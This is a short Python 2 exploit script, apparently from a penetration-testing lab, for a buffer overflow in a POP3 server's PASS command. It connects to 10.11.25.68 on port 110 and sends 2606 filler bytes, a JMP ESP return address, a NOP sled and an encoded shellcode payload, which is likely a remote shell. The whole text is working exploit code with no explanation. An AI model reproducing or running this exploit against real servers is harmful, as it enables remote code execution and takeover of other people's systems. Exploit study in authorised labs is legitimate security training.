#!/usr/bin/python

import socket
import sys

shellCode = "\xb8\x4f\x9a\xbf\xc9\xdd\xc3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x8c\x9e\x5d\x3c\xee\x77\x23\xbf\x0e\x88\x44\x49\xeb\xb9\x44\x2d\x78\xe9\x74\x25\x2c\x06\xfe\x6b\xc4\x9d\x72\xa4\xeb\x16\x38\x92\xc2\xa7\x11\xe6\x45\x24\x68\x3b\xa5\x15\xa3\x4e\xa4\x52\xde\xa3\xf4\x0b\x94\x16\xe8\x38\xe0\xaa\x83\x73\xe4\xaa\x70\xc3\x07\x9a\x27\x5f\x5e\x3c\xc6\x8c\xea\x75\xd0\xd1\xd7\xcc\x6b\x21\xa3\xce\xbd\x7b\x4c\x7c\x80\xb3\xbf\x7c\xc5\x74\x20\x0b\x3f\x87\xdd\x0c\x84\xf5\x39\x98\x1e\x5d\xc9\x3a\xfa\x5f\x1e\xdc\x89\x6c\xeb\xaa\xd5\x70\xea\x7f\x6e\x8c\x67\x7e\xa0\x04\x33\xa5\x64\x4c\xe7\xc4\x3d\x28\x46\xf8\x5d\x93\x37\x5c\x16\x3e\x23\xed\x75\x57\x80\xdc\x85\xa7\x8e\x57\xf6\x95\x11\xcc\x90\x95\xda\xca\x67\xd9\xf0\xab\xf7\x24\xfb\xcb\xde\xe2\xaf\x9b\x48\xc2\xcf\x77\x88\xeb\x05\xd7\xd8\x43\xf6\x98\x88\x23\xa6\x70\xc2\xab\x99\x61\xed\x61\xb2\x08\x14\xe2\xb7\xc7\x16\x20\xaf\xd5\x16\xc5\x8b\x53\xf0\xaf\xfb\x35\xab\x47\x65\x1c\x27\xf9\x6a\x8a\x42\x39\xe0\x39\xb3\xf4\x01\x37\xa7\x61\xe2\x02\x95\x24\xfd\xb8\xb1\xab\x6c\x27\x41\xa5\x8c\xf0\x16\xe2\x63\x09\xf2\x1e\xdd\xa3\xe0\xe2\xbb\x8c\xa0\x38\x78\x12\x29\xcc\xc4\x30\x39\x08\xc4\x7c\x6d\xc4\x93\x2a\xdb\xa2\x4d\x9d\xb5\x7c\x21\x77\x51\xf8\x09\x48\x27\x05\x44\x3e\xc7\xb4\x31\x07\xf8\x79\xd6\x8f\x81\x67\x46\x6f\x58\x2c\x66\x92\x48\x59\x0f\x0b\x19\xe0\x52\xac\xf4\x27\x6b\x2f\xfc\xd7\x88\x2f\x75\xdd\xd5\xf7\x66\xaf\x46\x92\x88\x1c\x66\xb7"

#buffer=sys.argv[1]
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellCode
print "Fuzzing PASS with %s bytes" %len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "connecting"
connect = s.connect(('10.11.25.68', 110))
print "sending"
print s.recv(1024)
s.send('USER test\r\n')
print s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()

#jmp esp = FFE4 found at 0x5f4a358f